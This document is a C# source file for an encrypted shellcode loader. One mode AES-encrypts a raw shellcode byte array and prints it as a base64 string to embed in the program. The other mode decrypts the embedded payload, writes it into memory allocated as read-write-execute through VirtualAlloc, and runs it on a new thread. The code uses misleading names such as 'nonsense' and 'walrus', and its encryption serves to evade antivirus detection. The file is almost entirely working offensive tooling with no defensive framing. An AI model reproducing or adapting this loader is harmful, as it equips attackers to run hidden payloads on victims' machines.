using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace goodTimes
{
    class Program
    {
        // MAIN
        static void Main(string[] args)
        {
            // ENCRYPT PAYLOAD
            if (args.Length == 1)
            {
                if (!File.Exists($@"{args[0]}"))
                {
                    Environment.Exit(1);
                }

                // Read in Byte[] Shellcode from File
                String fileData = System.IO.File.ReadAllText($@"{args[0]}");
                String tmp = (fileData.Split('{')[1]).Split('}')[0];

                // Translate to Byte Array
                string[] s = tmp.Split(',');
                byte[] data = new byte[s.Length];
                for (int i = 0; i < data.Length; i++)
                    data[i] = byte.Parse(s[i].Replace("0x", ""), System.Globalization.NumberStyles.HexNumber);

                // Encrypt and Encode the data:
                byte[] e_data = Encrypt(data, Resources.key, Resources.iv);
                String finalPayload = Convert.ToBase64String(e_data);
                Console.WriteLine($"\n\n        public static string walrus = " + '"' + $"{finalPayload}" + '"' + ';');

                Environment.Exit(0);
            }
            // THROW EXCEPTION IF MORE THAN 1 ARG
            else if (args.Length > 1)
            {
                Environment.Exit(1);
            }
            // RUN PAYLOAD 
            else
            {
                byte[] de_data = Decrypt(Convert.FromBase64String(Resources.walrus), Resources.key, Resources.iv);
                nonsense(de_data);
            }

        }

        // Shell Code Loader
        public static bool nonsense(byte[] shellcode)
        {

            try
            {
                UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;

                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);

                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("exception: " + e.Message);
                return false;
            }
        }

        // Used to Load Shellcode into Memory:
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
          IntPtr hHandle,
          UInt32 dwMilliseconds
        );


        public static byte[] Encrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, encryptor);
                }
            }
        }

        public static byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, decryptor);
                }
            }
        }

        private static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

    }
}
